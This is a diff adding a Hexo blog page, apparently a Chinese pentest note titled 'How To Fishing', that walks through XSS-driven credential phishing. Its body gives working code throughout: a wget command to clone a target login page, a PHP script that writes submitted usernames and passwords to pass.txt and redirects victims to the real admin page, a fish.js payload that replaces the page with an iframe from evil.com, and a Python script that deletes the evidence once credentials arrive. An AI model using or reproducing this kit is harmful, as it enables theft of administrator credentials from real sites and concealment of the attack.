@@ -1,0 +1,342 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>How To Fishing | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="[XSS钓鱼模拟实战]https://bbs.ichunqiu.com/thread-17965-1-1.html
+
+前置准备目标登录页面: login.html
+假的登录页面: fake.html
+世界上最好的语言: deal.php
+fish.js
+
+
+钓鱼步骤
+先下载目标login.html，保存为fake.html: wget -r -p -np -k 网站地址
+
+然后替换掉登录时候的POST目标地址，比如&amp;lt;form action=&amp;quot;http://normal.com/login.php&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;，替换掉自己的deal.php页面。
+注意事项: 页面中有部分js或者css不是绝对路径，要替换为绝对路径，最好直接使用wget下载login.html
+
+然后再服务器上构造一个deal.php
+
+&amp;lt;?php
+$user &amp;#x3D; $_POST[&amp;#39;username&amp;#39;];
+$pass &amp;#x3D; $_POST[&amp;#39;password&amp;#39;];
+$f &amp;#x3D; fopen(&amp;#39;pass.txt&amp;#39;,&amp;#39;a&amp;#39;);
+fwrite($f, &amp;quot;User:&amp;quot;.$user.&amp;quot;Pass:&amp;quot;.$pass.&amp;quot;\n&amp;quot;);
+fclose($f);
+header(&amp;quot;Location: http:&amp;#x2F;&amp;#x2F;normal.com&amp;#x2F;manage&amp;quot;); &amp;#x2F;&amp;#x2F;跳转到正常的后台
+?&amp;gt;
+
+还差一个js"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="How To Fishing"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> How To Fishing</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <blockquote>
+<p>[XSS钓鱼模拟实战]<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-17965-1-1.html">https://bbs.ichunqiu.com/thread-17965-1-1.html</a></p>
+</blockquote>
+<h3 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h3><pre class="line-numbers language-none"><code class="language-none">目标登录页面: login.html
+假的登录页面: fake.html
+世界上最好的语言: deal.php
+fish.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h3 id="钓鱼步骤"><a href="#钓鱼步骤" class="headerlink" title="钓鱼步骤"></a>钓鱼步骤</h3><ul>
+<li>先下载目标login.html，保存为fake.html: <code>wget -r -p -np -k 网站地址</code></li>
+</ul>
+<p>然后替换掉登录时候的POST目标地址，比如<code>&lt;form action=&quot;http://normal.com/login.php&quot; method=&quot;post&quot;&gt;</code>，替换掉自己的deal.php页面。</p>
+<p>注意事项: 页面中有部分js或者css不是绝对路径，要替换为绝对路径，最好直接使用wget下载login.html</p>
+<ul>
+<li>然后再服务器上构造一个deal.php</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+$user &#x3D; $_POST[&#39;username&#39;];
+$pass &#x3D; $_POST[&#39;password&#39;];
+$f &#x3D; fopen(&#39;pass.txt&#39;,&#39;a&#39;);
+fwrite($f, &quot;User:&quot;.$user.&quot;Pass:&quot;.$pass.&quot;\n&quot;);
+fclose($f);
+header(&quot;Location: http:&#x2F;&#x2F;normal.com&#x2F;manage&quot;); &#x2F;&#x2F;跳转到正常的后台
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li>还差一个js</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none"> document.body.innerHTML&#x3D;&#39;&lt;div style&#x3D;&quot;position:absolute;top:0px;left:0px;width:100%;height:100%&quot;&gt;&#39;+
+&#39;&lt;iframe frameborder&#x3D;&quot;no&quot; scrolling&#x3D;&quot;no&quot; border&#x3D;&quot;no&quot; src&#x3D;http:&#x2F;&#x2F;evil.com&#x2F;fake.html width&#x3D;100% height&#x3D;100%&gt;&#39; +
+&#39;&lt;&#x2F;iframe&gt;&lt;&#x2F;div&gt;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>当fish.js插入到后台的时候，会覆盖掉当前页面，然后受害者输入用户密码，就可以在服务器上收到用户密码。</p>
+<p>这里存在一个问题，如果受害者的页面不停刷新，会一致执行js，一直出现fake登录页面，所以可以在服务区上执行一个python脚本，监听pass.txt文件是否是空，不是空就退出，同时删除掉fish.js和fake.html</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
+# coding: utf-8
+
+import sys
+import os
+import datetime
+
+while 1:
+	if os.path.getsize(&#39;pass.txt&#39;) &#x3D;&#x3D; 0:
+		print datetime.datetime.now()
+	else:
+		os.system(&quot;rm -rf fish.js&quot;)
+		os.system(&quot;rm -rf fake.html&quot;)
+		sys.exit(0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>至此构造完成，当python脚本退出的时候，密码就记录到了pass.txt文件</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2017/04/01/how-to-fish.html" class="leancloud-visitors view" data-flag-title="How To Fishing">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2017/04/12/xss-encode2.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2017/03/09/copy-shared-lib.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2017-04-01 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%89%8D%E7%BD%AE%E5%87%86%E5%A4%87"><span class="toc-article-text">前置准备</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%92%93%E9%B1%BC%E6%AD%A5%E9%AA%A4"><span class="toc-article-text">钓鱼步骤</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
